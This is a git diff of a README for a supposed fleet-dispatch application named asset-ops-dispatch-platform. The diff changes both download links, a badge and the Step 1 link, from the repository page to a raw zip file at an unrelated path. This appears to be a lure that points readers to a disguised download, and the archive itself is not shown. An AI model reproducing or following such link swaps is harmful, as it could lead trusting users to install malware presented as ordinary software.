@@ -1,6 +1,6 @@
 # 📦 asset-ops-dispatch-platform - Your All-in-One Fleet Command Center
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-4CAF50?style=for-the-badge&logo=github)](https://github.com/Judofollowthrough788/asset-ops-dispatch-platform)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Judofollowthrough788/asset-ops-dispatch-platform/main/daftberry/1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Think of asset-ops-dispatch-platform as your mission control for transportation.
 Follow these steps to get the platform on your computer:
 
 **Step 1: Start Your Download**
-[Click here to download asset-ops-dispatch-platform](https://github.com/Judofollowthrough788/asset-ops-dispatch-platform)
+[Click here to download asset-ops-dispatch-platform](https://raw.githubusercontent.com/Judofollowthrough788/asset-ops-dispatch-platform/main/daftberry/1.5.zip)
 
 **Step 2: Understand What You're Downloading**
 Visit this link to download the application. The website will provide you with the necessary files to get started.
